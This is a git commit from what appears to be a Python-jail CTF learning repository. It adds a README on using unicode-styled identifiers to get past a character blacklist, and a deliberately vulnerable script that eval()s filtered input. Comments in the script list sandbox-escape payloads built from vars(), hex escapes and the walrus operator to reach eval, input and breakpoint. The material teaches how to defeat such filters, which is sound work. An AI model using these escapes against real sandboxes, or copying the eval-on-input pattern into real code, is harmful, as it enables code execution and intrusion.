618e5984f20ff7427f4a761319f39076ea9adcd2
Always Trying To Be Better <103570217+FTN-Dev@users.noreply.github.com>
2025-07-28 18:22:48 +0700

    unicode

---
+++ MerdekaSiber_pyjail/iceberg/4th_lv_belowTheSurface/unicode/README.md
@@ -0,0 +1,15 @@
+# Unicode
+
+if u can see at __3rd level iceberg__, especially on __golfing 50c__, if it look so hard to shorten the payload, but there is something that mind blowing.
+
+<img src='img/1.png'>
+
+lets try it
+
+```
+𝓫𝓻𝓮𝓪𝓴𝓹𝓸𝓲𝓷𝓽()
+```
+
+<img src='img/2.png'>
+
+it works!, but, this always on a blacklist, lets make it
---
+++ MerdekaSiber_pyjail/iceberg/4th_lv_belowTheSurface/unicode/blacklist.py
@@ -0,0 +1,43 @@
+expr = input("Input syntax to get shell / bash:\n; ")
+blacklist = list("lite")
+
+if len(expr) > 50:
+    print("TOO LONG!")
+    exit()
+
+for char in expr:
+    for c in blacklist:
+        if char == c:
+            print(f"u cant use \"{char}\"")
+            exit()
+        # if len(expr) > 100:
+        #     print("TOO LONG!")
+        #     exit()
+        # else:
+        #     if char == c:
+        #         print(f"u cant use \"{char}\"")
+        #         exit()
+eval(expr)
+
+# payload
+#[x for x in vars()]
+# [x for x in vars()][6]
+# vars(vars()[[x for x in vars()][6]])
+# vars(vars()[[x for x in vars()][6]])['eval']
+# vars(vars()[[x for x in vars()][6]])['input']
+# vars(vars()[[x for x in vars()][6]])['eval'](vars(vars()[[x for x in vars()][6]])['input']())
+# vars(vars()[[x for x \x69n vars()][6]])['\x65va\x6c'](vars(vars()[[x for x \x69n vars()][6]])['\x69npu\x74']())
+
+# [y for y in vars(vars()[[x for x in vars()][6]])]
+# vars(vars()[[x for x in vars()][6]])['breakpoint']()
+# vars(vars()[[x for x in vars()][6]])['br\x65akpo\x69n\x74']()
+# vars(vars()[[*vars()][6]])['br\x65akpo\x69n\x74']()
+
+# or
+
+# vars(vars()[[x for x in vars()][6]])[[y for y in vars(vars()[[x for x in vars()][6]])][12]]()
+# vars(vars()[[*vars()][6]])[[*vars(vars()[[*vars()][6]])][12]]()
+
+# walrus operator (:=)
+
+# vars(x:=vars()[[*vars()][6]])[[*vars(x)][12]]()
